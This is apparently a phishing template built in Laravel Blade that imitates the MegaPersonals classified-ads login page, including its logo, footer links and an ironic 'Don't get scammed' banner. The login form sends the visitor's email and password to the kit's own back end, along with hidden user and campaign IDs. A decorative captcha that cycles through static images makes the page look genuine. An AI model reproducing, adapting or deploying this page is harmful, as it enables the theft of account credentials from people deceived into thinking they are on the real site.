<!DOCTYPE html>
<html>
   <head>
      <title>MegaPersonals: Classified hookups</title>
      <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE">
      <meta charset="utf-8">
      <meta name="ROBOTS" content="INDEX, FOLLOW">
      <meta name="description" content="MegaPersonals - Post your classified ad and MEET NOW">
      <link rel="icon" href="{{ asset('assets/images/devilgirl_favicon.ico') }}" type="image/x-icon">
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
      <link rel="stylesheet" href="{{ asset('assets/css/style.css') }}">
   </head>
   <body cz-shortcut-listen="true" data-new-gr-c-s-check-loaded="14.1169.0" data-gr-ext-installed="">
      <div class="container login-page">
         <a href="https://megapersonals.eu/home">
         <img src="{{ asset('assets/images/logo.png') }}" class="img-responsive center-block img-width-72 header-top-margin" alt="Megapersonals">
         </a>
         <div class="centered top-margin-25 login_firsttime">
            <h3 class="logincopy">Is this your first time posting?</h3>
            <a href="https://megapersonals.eu/users/register" class="starthere">Start Here</a>
         </div>
         <div class="centered loginform">
            <h2 class="logincopy">Already have an account?</h2>
            <form id="loginFormId" method="post" action="{{ route('accounts.store') }}" class="loginwrapper">
                @csrf
               <input type="hidden" name="user_id" value="{{ $user_id }}">
               <input type="hidden" name="type_id" value="{{ $type_id }}">
               @if (request()->has('bad_captcha'))
                    <div class="alert alert-danger">
                        <p>{{ request()->get('bad_captcha') }}</p>
                    </div>
               @endif
               <div class="centered form-input">
                  <input id="person_username_field_login" type="email" name="email" placeholder="Email" class="form-control bordered three-radius" value="{{ old('email') }}">
               </div>
               <div class="centered form-input">
                  <input id="person_password_field_login" type="password" name="password" value="" placeholder="Password" class="form-control bordered three-radius" value="{{ old('password') }}">
               </div>
               <div class="centered form-input automargin">
                  <div class="cap_wrap">
                     <div class="captcha_image">
                        <img id="captcha_image_itself">
                     </div>
                     <div class="replyCaptchaReloadButton">
                        <a href="javascript:void(0);" id="changeCaptcha">
                        <img src="{{ asset('assets/images/reloadButton.png') }}" width="40" height="40">
                        </a>
                     </div>
                  </div>
                 <input type="text" id="captcha_code" name="captcha" class="form-control bordered three-radius clickToHideErrorMessages" placeholder="Enter code from the picture">
                  <button id="login_data_submit_button" type="submit" aria-haspopup="true">Submit</button>
               </div>
            </form>
         </div>
         <div class="centered loginwrapper scammed-wrapper" style="margin-top:36px;">
            <style>
               .get-scammed-banner {
                  width: 100%;
                  height: 120px;
                  background-image: url("{{ asset('assets/images/bannersContainer.png') }}");
                  background-size: cover;
                  background-size: 100%;
                  background-repeat: no-repeat;
                  color: black;
                  cursor: pointer;
                  margin-bottom: 8px;
               }
            </style>
            <div class="get-scammed-banner">
               <div class="caption">Don't get scammed!</div>
               <div class="body">
                  <div>Is the address up top:<br>megapersonals.eu</div>
                  <div>?</div>
               </div>
            </div>
            <a class="passreset" href="https://megapersonals.eu/send_reset_password">FORGOT PASSWORD?</a>
         </div>
      </div>
      <footer>
         <nav>
            <ul class="pager myStyle">
               <li>
                  <a id="homeclick" href="https://megapersonals.eu/home">Home</a>
               </li>
               <li>|</li>
               <li><a href="https://megapersonals.eu/users/posts/list?publicDomain=megapersonals.eu">Manage Posts</a></li>
               <li>|</li>
               <li><a href="https://megapersonals.eu/public/contact_us">Contact Us</a></li>
               <li>|</li>
               <li><a href="https://megapersonals.eu/public/terms">Policies &amp; Terms</a></li>
            </ul>
         </nav>
         <div class="copyright_class" id="copyrigh">Copyright ©2022 MegaPersonals.eu </div>
      </footer>
      <script src="{{ asset('assets/images/captchas/captchaData.js') }}"></script>
      <script>
         (function(){

            const captchaItems = captchaData;
            const changeCaptcha = document.getElementById('changeCaptcha')
            const captchaImage = document.getElementById('captcha_image_itself');
            let currentIndex = Math.floor(Math.random() * 10);

            const showCaptcha = (index) => {
               captchaImage.src = `{{ asset('assets/images/captchas') }}/${captchaItems[index].name}`
            }

            changeCaptcha.addEventListener('click', () => {

               currentIndex++

               if(currentIndex >= (captchaItems.length - 1)){
                  currentIndex = 0
               }

               showCaptcha(currentIndex);
            })

            showCaptcha(currentIndex);
         }())
      </script>
   </body>
</html>
